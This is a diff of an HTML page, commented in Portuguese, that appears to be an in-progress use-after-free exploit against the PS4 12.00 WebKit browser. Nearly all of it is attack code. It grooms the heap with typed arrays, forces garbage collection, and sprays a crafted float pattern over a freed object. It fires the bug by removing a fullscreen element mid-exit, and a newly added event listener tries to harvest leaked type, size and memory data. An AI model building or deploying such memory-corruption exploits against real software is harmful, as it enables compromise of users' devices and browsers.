@@ -1,60 +1,88 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Gatilho Cirúrgico</title>
+<title>PS4 UAF - Info Leak Event Trapper</title>
+<style>
+    body { background-color: #111; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px;}
+    #log { margin-top: 20px; white-space: pre-wrap; }
+    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
+</style>
 </head>
-<body style="background-color: #222; color: #fff;">
+<body>
 
-<h2>PS4 12.00 - UAF Confirmation (Teste Cirúrgico do Fullscreen)</h2>
-
-<button onclick="runTest()" style="padding: 10px; font-size: 16px;">Executar Teste: Destruição do Alvo</button>
-
-<div id="log"></div>
+<h2>PS4 12.00 - Info Leak via Event Trap</h2>
+<button onclick="runTest()" style="padding: 15px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Interceptação</button>
+<div id="log">Aguardando...</div>
 
 <script>
-const PATTERN = 2.121995791e-314;
+// Padrão 0x2222222222222222 (Mais seguro para tentar ler sem causar segfault imediato)
+const PATTERN = 1.1125369292536e-308; 
+
+// Listener global para tentar capturar o objeto "Zumbi" durante a transição
+document.addEventListener('webkitfullscreenchange', (event) => {
+    let log = document.getElementById("log");
+    log.innerHTML += "<br><span style='color: yellow;'>[*] Evento webkitfullscreenchange INTERCEPTADO!</span>";
+    
+    try {
+        // O C++ tenta nos dizer quem disparou o evento. É aqui que o leak ocorre!
+        let alvoZumbi = event.target;
+        let fsAtual = document.webkitFullscreenElement;
+        
+        log.innerHTML += `<br>[*] Tag do alvo do evento: ${alvoZumbi ? alvoZumbi.tagName : 'null'}`;
+        
+        if (alvoZumbi && alvoZumbi.tagName !== 'DIV') {
+            log.innerHTML += `<br><span class="leak">[!!!] LEAK DE TIPO! TagName corrompido: ${alvoZumbi.tagName}</span>`;
+        }
+
+        if (alvoZumbi) {
+            // Tenta ler propriedades internas que podem estar lendo o nosso Spray (0x22222222)
+            let larguraLeak = alvoZumbi.clientWidth;
+            log.innerHTML += `<br>[*] clientWidth do alvo: ${larguraLeak}`;
+            
+            if (larguraLeak > 10000) {
+                log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK GEOMÉTRICO CONFIRMADO: ${larguraLeak}</span>`;
+            }
+        }
+    } catch(e) {
+        // Às vezes o motor C++ lança uma exceção com partes da memória vazada na string de erro
+        log.innerHTML += `<br><span class="leak">[!] Exceção capturada no evento: ${e.message}</span>`;
+    }
+});
 
 function runTest() {
     const log = document.getElementById("log");
-    log.innerHTML = "<p>Running... Press OPTIONS</p>";
+    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";
 
     let controllers = [];
 
-    // Passo 1: Alocação (Heap Grooming)
+    // [1] Alocação
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // Criação do alvo do Fullscreen em vez de usar o documentElement
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Tela Cheia Ativa<br>Pressione OPTIONS agora</h1>";
-    fsTarget.style.backgroundColor = "black";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.position = "absolute";
-    fsTarget.style.top = "0";
-    fsTarget.style.left = "0";
+    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Trap Ativada<br>Aperte OPTIONS</h1>";
+    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
     document.body.appendChild(fsTarget);
 
-    // Entra em Fullscreen usando o nosso alvo específico
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
     }
 
     window.onblur = function() {
-        // FORÇA GC
-        controllers = null;
+        log.innerHTML += "<br>[*] Onblur. Forçando GC e Spray...";
 
+        // [2] GC
+        controllers = null;
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // Spray mantido (Essencial para sobrescrever o objeto C++ deletado)
+        // [3] Spray Envenenado
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
@@ -62,22 +90,21 @@ function runTest() {
             spray.push(p);
         }
 
-        // Gatilho crítico Cirúrgico
+        // [4] Gatilho Cirúrgico
         setTimeout(() => {
+            log.innerHTML += "<br>[*] Acionando Gatilho (Remove -> Exit -> Reload)...";
             try {
-                // 1. Destruímos apenas o elemento hospedeiro da tela cheia!
                 fsTarget.remove(); 
                 
-                // 2. Forçamos o WebKit a tentar resolver a saída da tela cheia agora que o elemento sumiu.
                 if (document.webkitIsFullScreen || document.fullscreenElement) {
                     document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                 }
             } catch(e) {
-                console.log("[ERRO NO GATILHO]", e);
+                log.innerHTML += "<br>[Erro] " + e;
             }
 
-            // O fallback que ajuda a engatilhar a destruição caso o exitFullscreen apenas enfileire a tarefa
-            setTimeout(() => location.reload(), 500);
+            // Aumentei o tempo do reload para 1000ms para dar tempo de lermos os logs do Event Listener antes do crash/reload
+            setTimeout(() => location.reload(), 1000);
         }, 3000);
     };
 }
